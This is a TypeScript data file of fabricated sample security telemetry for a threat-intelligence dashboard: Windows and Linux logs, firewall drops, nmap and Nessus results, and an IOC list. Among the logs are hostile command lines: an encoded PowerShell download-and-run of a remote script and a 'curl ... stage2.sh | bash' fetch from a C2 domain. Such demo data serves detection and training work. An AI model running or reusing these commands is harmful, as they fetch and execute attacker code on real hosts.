// ─── Data Honesty & Provenance Notice ──────────────────────────────────────────
// NOTE: 本檔案僅供 IOC 資料庫頁面之靜態參考資料使用，非即時遙測資料來源 (Referential Static Data Only)。
// 符合 CyberMind AI 作品集「資料誠實性原則」，避免靜態示範資料與即時生產遙測混淆。
// ─────────────────────────────────────────────────────────────────────────────

export const SAMPLE_WINDOWS_LOGS = `<Events>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{5484fe3a-325d-400c-80fd-1671639bc43f}" />
      <EventID>4625</EventID>
      <TimeCreated SystemTime="2026-07-25T14:22:01.120Z" />
      <Computer>DC-SRV-01.corp.internal</Computer>
    </System>
    <EventData>
      <Data Name="TargetUserName">Administrator</Data>
      <Data Name="WorkstationName">WORKSTATION-X</Data>
      <Data Name="IpAddress">192.168.1.155</Data>
      <Data Name="FailureReason">Unknown user name or bad password.</Data>
      <Data Name="LogonType">3</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4688</EventID>
      <TimeCreated SystemTime="2026-07-25T14:25:30.450Z" />
      <Computer>DC-SRV-01.corp.internal</Computer>
    </System>
    <EventData>
      <Data Name="SubjectUserName">SYSTEM</Data>
      <Data Name="NewProcessName">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>
      <Data Name="CommandLine">powershell.exe -ExecutionPolicy Bypass -enc SQBFAFgAKABOAGV3LU9iAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADMALgAyADIAMAAuADEAMAAxAC4ANQAvADQANAA0ADQALwBzAGgAZQBsAGwALgBwAHMAMQAnACkA</Data>
      <Data Name="ParentProcessName">C:\\Windows\\System32\\cmd.exe</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>4720</EventID>
      <TimeCreated SystemTime="2026-07-25T14:28:10.890Z" />
      <Computer>DC-SRV-01.corp.internal</Computer>
    </System>
    <EventData>
      <Data Name="TargetUserName">shadow_admin</Data>
      <Data Name="SubjectUserName">Administrator</Data>
      <Data Name="PrivilegeList">SeDebugPrivilege, SeTakeOwnershipPrivilege</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" />
      <EventID>1102</EventID>
      <TimeCreated SystemTime="2026-07-25T14:30:00.000Z" />
      <Computer>DC-SRV-01.corp.internal</Computer>
    </System>
    <EventData>
      <Data Name="SubjectUserName">shadow_admin</Data>
      <Data Name="Message">The audit log was cleared.</Data>
    </EventData>
  </Event>
</Events>`;

export const SAMPLE_LINUX_LOGS = `Jul 25 14:10:01 web-prod-01 sshd[14201]: Failed password for invalid user admin from 185.220.101.5 port 54221 ssh2
Jul 25 14:10:03 web-prod-01 sshd[14205]: Failed password for invalid user root from 185.220.101.5 port 54224 ssh2
Jul 25 14:10:05 web-prod-01 sshd[14209]: Failed password for invalid user root from 185.220.101.5 port 54228 ssh2
Jul 25 14:12:15 web-prod-01 sshd[14300]: Accepted password for deploy from 185.220.101.5 port 54300 ssh2
Jul 25 14:15:00 web-prod-01 sudo:   deploy : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash -c curl http://malicious-c2.ru/stage2.sh | bash
Jul 25 14:16:30 web-prod-01 kernel: [ 4821.1092] Out of memory: Kill process 14500 (crypto_miner) score 950 or sacrifice child`;

export const SAMPLE_FIREWALL_LOGS = `2026-07-25T14:05:12Z PaloAlto TRAFFIC DROP src=192.168.1.105 dst=185.220.101.5 proto=TCP sport=49152 dport=4444 bytes=512 action=DENY rule=Block_C2_Ports
2026-07-25T14:05:15Z PaloAlto TRAFFIC DROP src=192.168.1.105 dst=185.220.101.5 proto=TCP sport=49153 dport=4444 bytes=512 action=DENY rule=Block_C2_Ports
2026-07-25T14:05:18Z PaloAlto TRAFFIC DROP src=192.168.1.105 dst=185.220.101.5 proto=TCP sport=49154 dport=4444 bytes=512 action=DENY rule=Block_C2_Ports
2026-07-25T14:11:00Z CiscoASA-1-106023: Deny tcp src outside:45.33.32.156/49212 dst inside:192.168.1.10/22 by access-group "OUTSIDE-IN"
2026-07-25T14:11:01Z CiscoASA-1-106023: Deny tcp src outside:45.33.32.156/49213 dst inside:192.168.1.10/23 by access-group "OUTSIDE-IN"
2026-07-25T14:11:02Z CiscoASA-1-106023: Deny tcp src outside:45.33.32.156/49214 dst inside:192.168.1.10/445 by access-group "OUTSIDE-IN"`;

export const SAMPLE_NMAP_XML = `<?xml version="1.0" encoding="UTF-8"?>
<nmaprun scanner="nmap" args="nmap -sV -sC -O -p- 192.168.1.10" start="1784992800">
  <host>
    <status state="up" />
    <address addr="192.168.1.10" addrtype="ipv4" />
    <hostnames><hostname name="srv-db-finance.corp.internal" type="PTR" /></hostnames>
    <ports>
      <port protocol="tcp" portid="21"><state state="open" /><service name="ftp" product="vsftpd" version="2.3.4" /><script id="ftp-anon" output="Anonymous FTP login allowed" /></port>
      <port protocol="tcp" portid="80"><state state="open" /><service name="http" product="Apache httpd" version="2.4.49" /><script id="http-path-traversal" output="Vulnerable to CVE-2021-41773 Path Traversal" /></port>
      <port protocol="tcp" portid="445"><state state="open" /><service name="microsoft-ds" product="Windows Server 2008 R2" /><script id="smb-vuln-ms17-010" output="VULNERABLE: Remote Code Execution vulnerability (EternalBlue)" /></port>
      <port protocol="tcp" portid="3389"><state state="open" /><service name="ms-wbt-server" product="Microsoft Terminal Services" /><script id="rdp-enum-encryption" output="Weak CredSSP Encryption supported" /></port>
    </ports>
    <os><osmatch name="Microsoft Windows Server 2008 R2 SP1" accuracy="98" /></os>
  </host>
</nmaprun>`;

export const SAMPLE_NESSUS_SCAN = `[
  {
    "id": "NV-10492",
    "cve": "CVE-2021-44228",
    "name": "Apache Log4j Remote Code Execution (Log4Shell)",
    "severity": "Critical",
    "cvss": 10.0,
    "host": "192.168.1.50",
    "port": 8080,
    "protocol": "TCP",
    "exploitAvailable": true,
    "patchPriority": "Immediate (P0)",
    "description": "JNDI lookup feature in Apache Log4j 2.0-beta9 through 2.15.0 allows unauthenticated RCE via payload string."
  },
  {
    "id": "NV-8472",
    "cve": "CVE-2017-0144",
    "name": "MS17-010: Security Update for Microsoft Windows SMB Server (EternalBlue)",
    "severity": "Critical",
    "cvss": 9.8,
    "host": "192.168.1.10",
    "port": 445,
    "protocol": "TCP",
    "exploitAvailable": true,
    "patchPriority": "Immediate (P0)",
    "description": "Remote code execution vulnerability in Microsoft Server Message Block 1.0 (SMBv1) server."
  },
  {
    "id": "NV-5012",
    "cve": "CVE-2023-38831",
    "name": "WinRAR Spoofing File Extension Code Execution",
    "severity": "High",
    "cvss": 7.8,
    "host": "192.168.1.102",
    "port": 0,
    "protocol": "Local",
    "exploitAvailable": true,
    "patchPriority": "High (P1)",
    "description": "Processing of crafted zip archives allows execution of arbitrary code when opening benign-looking files."
  }
]`;

export const SAMPLE_IOC_LIST = [
  { ip: "185.220.101.5", type: "IP Address", threat: "Cobalt Strike C2 Node", confidence: 99, country: "RU", lastSeen: "2026-07-25 14:30", source: "AbuseIPDB / AlienVault" },
  { ip: "45.33.32.156", type: "IP Address", threat: "Masscan Port Scanner", confidence: 88, country: "US", lastSeen: "2026-07-25 14:11", source: "Shodan Intelligence" },
  { hash: "e2c569be17396eca2a2e30e19444bc9a10d0f507b5a5b5b292f7c00e12345678", type: "SHA256", threat: "LockBit 3.0 Ransomware Payload", confidence: 100, country: "Global", lastSeen: "2026-07-24 18:00", source: "VirusTotal" },
  { domain: "update-microsoft-auth.ru", type: "Domain", threat: "Credential Harvesting Phishing", confidence: 94, country: "RU", lastSeen: "2026-07-25 10:15", source: "Cisco Talos" }
];
